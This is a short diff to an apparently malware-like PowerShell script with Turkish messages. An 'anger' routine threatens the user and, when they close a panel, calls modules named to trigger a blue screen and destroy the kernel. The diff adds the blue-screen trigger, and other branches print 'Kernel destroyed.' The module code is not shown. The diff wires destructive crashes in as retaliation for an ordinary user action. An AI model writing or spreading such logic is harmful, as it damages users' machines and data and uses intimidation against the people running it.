@@ -22,13 +22,13 @@ function SinirGoster {
             7..9 {
                 Write-Host "[EN] KIZGINIM!" -ForegroundColor Red -BackgroundColor Black
                 if ($script:panel_kapandi) {
-                    Write-Host "[EN] Paneli kapattin! Kernel siliniyor!" -ForegroundColor Red
+                    Write-Host "[EN] Paneli kapattin! BSOD + Kernel!" -ForegroundColor Red
+                    . ./modul_bsod_tetikle.ps1
                     . ./modul_kernel_ye.ps1
                 } else {
                     Write-Host "[EN] Gorsel cokus baslatiliyor..." -ForegroundColor Red
                     . ./modul_gorsel_cokus.ps1
                 }
-                if (Test-Path "modul_tehdit_konusmasi.ps1") { . ./modul_tehdit_konusmasi.ps1 }
             }
             10 {
                 Write-Host "[EN] Kernel yok edildi." -ForegroundColor Red -BackgroundColor Black
